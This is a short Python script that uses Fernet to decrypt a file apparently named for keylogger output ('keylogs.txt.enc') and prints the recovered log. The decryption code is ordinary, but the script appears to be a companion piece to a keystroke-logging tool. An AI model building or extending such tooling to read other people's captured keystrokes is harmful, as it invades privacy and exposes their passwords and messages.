from cryptography.fernet import Fernet
import os

class Decryptor:
    def __init__(self, key_file="encryption.key", encrypted_file="keylogs.txt.enc", decrypted_file="decrypted_logs.txt"):
        self.key_file = key_file
        self.encrypted_file = encrypted_file
        self.decrypted_file = decrypted_file
        self.cipher = self.setup_encryption()

    def setup_encryption(self):
        """Loads the encryption key."""
        if not os.path.exists(self.key_file):
            print("Encryption key not found.")
            return None
        
        with open(self.key_file, 'rb') as key_file:
            key = key_file.read()
        return Fernet(key)

    def decrypt_file(self):
        """Decrypts the encrypted log file and saves the output."""
        if self.cipher is None:
            print("Decryption failed due to missing key.")
            return
        
        if not os.path.exists(self.encrypted_file):
            print(f"Encrypted file {self.encrypted_file} not found.")
            return
        
        with open(self.encrypted_file, 'rb') as enc_file:
            encrypted_data = enc_file.read()

        decrypted_data = self.cipher.decrypt(encrypted_data)
        
        with open(self.decrypted_file, 'wb') as dec_file:
            dec_file.write(decrypted_data)

        print(f"Decrypted logs saved as {self.decrypted_file}")
    
    def display_decrypted(self):
        """Optionally display the decrypted contents."""
        try:
            with open(self.decrypted_file, 'r') as dec_file:
                print("Decrypted Log:")
                print(dec_file.read())
        except FileNotFoundError:
            print(f"Decrypted file {self.decrypted_file} not found.")

if __name__ == '__main__':
    # You can specify the encrypted file name here
    decryptor = Decryptor()
    decryptor.decrypt_file()
    decryptor.display_decrypted()
